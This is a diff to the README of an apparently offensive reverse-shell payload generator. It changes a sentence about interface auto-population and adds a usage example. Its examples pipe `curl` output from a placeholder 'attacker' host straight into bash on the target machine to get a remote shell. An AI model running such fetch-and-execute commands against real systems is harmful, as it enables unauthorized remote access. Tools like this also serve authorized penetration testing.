@@ -11,7 +11,7 @@ Detects available software on the target and runs an appropriate payload.
 
 ### 1. Start the generator
 
-On your attacking machine, start the generator.  It will auto populate interfaces that have IP addresses and the `curl` command associated with it.  Not all interfaces in this output will be relevant and this is only useful if you use an interface name in the request.  
+On your attacking machine, start the generator.  It will auto populate interfaces that have IP addresses and the `curl` command associated with it if no arguments are provided.  Not all interfaces in this output will be relevant and this is only useful if you use an interface name in the request.  
 
 You can specify the http server listening port as well, otherwise it defaults to 8000.
 
@@ -54,6 +54,7 @@ On the target machine,
 ```shell examples
 curl -s http://attacker:8000/tun0|bash
 curl -s http://attacker:8000/IP:PORT|bash
+curl -s http://attacker:8000/IP|bash
 ```
 
 Go back to your machine, you should now have a shell prompt.
